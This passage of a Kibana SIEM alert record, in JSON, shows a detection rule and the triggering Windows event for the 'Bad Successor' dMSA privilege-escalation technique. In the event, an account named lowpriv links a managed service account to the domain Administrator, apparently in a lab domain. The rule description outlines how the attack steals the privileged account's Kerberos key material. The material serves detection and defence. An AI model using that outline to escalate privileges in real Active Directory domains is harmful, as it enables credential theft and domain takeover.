        "rule_id": "66177997-e44c-45a3-a2c9-c6196bb7b8ae",
        "license": "",
        "immutable": false,
        "meta": {
          "kibana_siem_app_url": "http://localhost:5601/app/security"
        },
        "setup": "",
        "from": "now-6m",
        "threat": {
          "framework": "MITRE ATT&CK",
          "tactic": {
            "id": "TA0004",
            "name": "Privilege Escalation",
            "reference": "https://attack.mitre.org/tactics/TA0004/"
          },
          "technique": [
            {
              "id": "T1098",
              "name": "Account Manipulation",
              "reference": "https://attack.mitre.org/techniques/T1098/",
              "subtechnique": []
            }
          ]
        },
        "to": "now"
      }
    ],
    "kibana.alert.rule.revision": [
      1
    ],
    "kibana.alert.rule.threat.tactic.id": [
      "TA0004"
    ],
    "signal.rule.version": [
      "1"
    ],
    "signal.original_event.kind": [
      "event"
    ],
    "kibana.alert.rule.threat.technique.name": [
      "Account Manipulation"
    ],
    "kibana.alert.status": [
      "active"
    ],
    "kibana.alert.last_detected": [
      "2026-04-12T07:51:35.033Z"
    ],
    "signal.depth": [
      1
    ],
    "signal.rule.immutable": [
      "false"
    ],
    "kibana.alert.rule.rule_type_id": [
      "siem.queryRule"
    ],
    "signal.rule.name": [
      "Bad Successor - dMSA Predecessor Link Attribute Write (EID 5136)"
    ],
    "kibana.alert.original_event.provider": [
      "Microsoft-Windows-Security-Auditing"
    ],
    "signal.rule.rule_id": [
      "66177997-e44c-45a3-a2c9-c6196bb7b8ae"
    ],
    "winlog.event_data.DSName": [
      "badsuccessor.local"
    ],
    "signal.rule.threat.tactic.reference": [
      "https://attack.mitre.org/tactics/TA0004/"
    ],
    "kibana.alert.rule.license": [
      ""
    ],
    "kibana.alert.original_event.kind": [
      "event"
    ],
    "winlog.event_data.ObjectClass": [
      "msDS-DelegatedManagedServiceAccount"
    ],
    "winlog.task": [
      "Logon"
    ],
    "signal.rule.threat.tactic.name": [
      "Privilege Escalation"
    ],
    "kibana.alert.rule.threat.framework": [
      "MITRE ATT&CK"
    ],
    "kibana.alert.rule.updated_at": [
      "2026-04-12T07:49:28.804Z"
    ],
    "signal.rule.description": [
      "Detects writes to the msDS-ManagedAccountPrecededByLink attribute on a Delegated Managed Service Account (dMSA) object. This attribute defines which legacy account a dMSA supersedes and inherits credentials from. Writing to this attribute is the core primitive of the Bad Successor attack (CVE-2025-29810), enabling a low-privileged attacker to link a dMSA to a high-privileged account such as Domain Administrator, then request a Kerberos ticket containing the target account's key material. This attribute has no legitimate operational use case outside of planned dMSA migrations performed by privileged administrators. Any write by a non-SYSTEM account should be treated as highly suspicious. Affected: Windows Server 2025 builds prior to 26100.4946."
    ],
    "winlog.event_data.SubjectUserName": [
      "lowpriv"
    ],
    "message": [
      "A directory service object was modified.\n\t\nSubject:\n\tSecurity ID:\t\tS-1-5-21-4102481429-207641625-1255947624-1106\n\tAccount Name:\t\tlowpriv\n\tAccount Domain:\t\tBADSUCCESSOR\n\tLogon ID:\t\t0x1628621\n\nDirectory Service:\n\tName:\tbadsuccessor.local\n\tType:\tActive Directory Domain Services\n\t\nObject:\n\tDN:\tCN=svc-backup,CN=Managed Service Accounts,DC=badsuccessor,DC=local\n\tGUID:\t{949b2961-a1a6-4336-835f-efe2e0bcc576}\n\tClass:\tmsDS-DelegatedManagedServiceAccount\n\t\nAttribute:\n\tLDAP Display Name:\tmsDS-ManagedAccountPrecededByLink\n\tSyntax (OID):\t2.5.5.1\n\tValue:\tCN=Administrator,CN=Users,DC=badsuccessor,DC=local\n\t\nOperation:\n\tType:\tValue Added\n\tCorrelation ID:\t{6b746e25-9937-4979-aaae-30dbb7a80948}\n\tApplication Correlation ID:\t-"
    ],
    "winlog.event_id": [
      "5136"
    ],
    "kibana.alert.original_event.outcome": [
      "success"
    ],
    "kibana.alert.rule.threat.tactic.reference": [
      "https://attack.mitre.org/tactics/TA0004/"
    ],
    "signal.original_event.action": [
      "Logon"
    ],
    "kibana.alert.rule.created_at": [
      "2026-04-12T07:06:31.599Z"
    ],
    "signal.rule.to": [
      "now"
    ],
    "winlog.event_data.AttributeValue": [
      "CN=Administrator,CN=Users,DC=badsuccessor,DC=local"
    ],
    "kibana.space_ids": [
      "default"
    ],
    "kibana.alert.rule.execution.type": [
      "scheduled"
    ],
    "kibana.alert.original_time": [
      "2026-04-12T07:50:44.349Z"
    ]
  }
}




